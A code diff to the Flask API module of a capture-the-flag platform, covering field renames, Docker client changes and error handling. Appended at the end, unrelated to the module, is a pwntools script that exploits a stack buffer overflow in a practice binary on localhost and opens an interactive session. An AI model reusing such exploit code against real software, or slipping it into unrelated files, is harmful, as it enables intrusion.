@@ -20,9 +20,10 @@ from app.models.admin import Notice
 from app.models.ctf import ImageResource, ContainerResource, Answer, Question
 from app.models.user import User
 from app.tasks.ctf import finish_container
-
+import logging
 bp = Blueprint("view", __name__, url_prefix='/api')
 
+logger = logging.getLogger('app')
 
 @bp.route('/upload/<path:filename>')
 def send_upload_file(filename):
@@ -87,7 +88,7 @@ def index():
             "type": item.type,
             "desc": item.desc,
             "name": item.name,
-            "integral": item.integral,
+            "score": item.score,
             "solved": solved_state.get(item.id, 0),
             "date_created": item.date_created.strftime("%y-%m-%d"),
             "has_solved": True if item.id in solved_qid else False
@@ -223,7 +224,7 @@ def challenge_list():
             "id": item.id,
             "type": item.type,
             "name": item.name,
-            "score": item.integral,
+            "score": item.score,
             "desc": item.desc,
             "active_flag": item.active_flag,
             "is_solved": bool(item.id in solved)
@@ -272,7 +273,7 @@ def challenge_detail(question):
         "third_blood": third_blood,
         "container": container_data,
         "get_score": get_score,
-        "score": instance.integral,
+        "score": instance.score,
         "id": instance.id,
         "name": instance.name,
         "attachment": [{"name": i["name"], "url": "/api/upload/{}?filename={}".format(i["filename"], i["name"])} for i
@@ -299,12 +300,15 @@ def question_start(question):
     instance = db.session.query(Question).get(question)
     if not instance.active_flag:
         return fail(msg="静态题库无需动态生成")
-    image_resource = db.session.query(ImageResource).filter(ImageResource.question_id == instance.id).one_or_none()
+    image_resource = instance.image
     if not image_resource:
         return fail(msg="服务器没有资源")
-    connect_url = "http://" + image_resource.host.addr
+    connect_url = image_resource.host.docker_api
     client = docker.DockerClient(connect_url)
-    image = client.images.get(image_resource.image_id)
+    try:
+        image = client.images.get('{}:{}'.format(image_resource.name,image_resource.version))
+    except docker.errors.ImageNotFound:
+        return fail(msg="当前题目环境缺失、请联系管理员！")
     # 解析镜像端口
     image_config = image.attrs["ContainerConfig"]
     random_port = ""
@@ -325,8 +329,12 @@ def question_start(question):
         c.remove()
     except docker.errors.NotFound:
         pass
-    docker_container_response = client.containers.run(image=image.id, name=container_name, ports=port_dict,
+    try:
+        docker_container_response = client.containers.run(image=image.id, name=container_name, ports=port_dict,
                                                       detach=True)
+    except docker.errors.APIError as e:
+        logger.exception(e)
+        return fail(msg="题目启动失败")
     # 获取创建的容器
     docker_container = client.containers.get(container_name)
     flag = generate_flag()
@@ -386,10 +394,10 @@ def question_destroy(question):
         return fail("静态题库无需动态生成")
     containers = db.session.query(ContainerResource, ImageResource).join(ImageResource,
                                                                          ImageResource.id == ContainerResource.image_resource_id). \
-        filter(ImageResource.question_id == instance.id, ContainerResource.user_id == g.user.id)
+        filter(ImageResource.id == instance.image_id, ContainerResource.user_id == g.user.id)
     for (container, image_resource) in containers:
         try:
-            client = docker.DockerClient("http://{}".format(image_resource.host.addr), timeout=3)
+            client = docker.DockerClient(image_resource.host.docker_api, timeout=3)
             docker_container = client.containers.get(container.container_id)
             docker_container.kill()
             docker_container.remove()
@@ -459,3 +467,21 @@ def score_rank():
     # 公告
     code, data = RankService.score_rank(**request.args)
     return success(data=data)
+
+
+
+if __name__ == "__main__":
+    from pwn import *
+
+    context.log_level = 'debug'
+
+    # p = process('./f4n_pwn')
+    p = remote('127.0.0.1', 9999)
+
+    p.recvuntil('length : ')
+    p.sendline('-1')
+    payload = 'a' * 0x57 + p32(0x080486BB)
+    p.recvuntil('name : \n')
+    p.sendline(payload)
+
+    p.interactive()
